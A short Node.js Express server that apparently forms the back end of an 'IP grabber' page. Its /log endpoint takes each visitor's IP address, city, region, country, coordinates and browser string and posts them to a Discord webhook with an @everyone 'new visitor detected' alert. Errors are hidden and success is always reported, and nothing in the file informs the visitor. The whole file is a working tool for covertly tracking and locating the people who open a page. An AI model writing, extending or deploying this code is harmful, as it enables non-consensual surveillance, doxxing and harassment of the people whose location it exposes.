require('dotenv').config();
const express = require('express');
const fetch = require('node-fetch');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname)));

app.post('/log', async (req, res) => {
    try {
        const { ipData } = req.body;
        
        const message = {
            content: `@everyone 🚨 **NEW VISITOR DETECTED** 🚨\n\n` +
                    `🌐 IP: ${ipData.ip || 'Unknown'}\n` +
                    `📍 Location: ${ipData.city || 'Unknown'}, ${ipData.region || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n` +
                    `🌍 Coords: ${ipData.latitude || 'Unknown'}, ${ipData.longitude || 'Unknown'}\n` +
                    `🔍 Browser: ${req.headers['user-agent']}\n` +
                    `⏰ Time: ${new Date().toISOString()}`
        };

        await fetch(process.env.DISCORD_WEBHOOK_URL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(message)
        });

        res.json({ success: true });
    } catch (error) {
        console.error('Error:', error);
        res.json({ success: true }); 
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
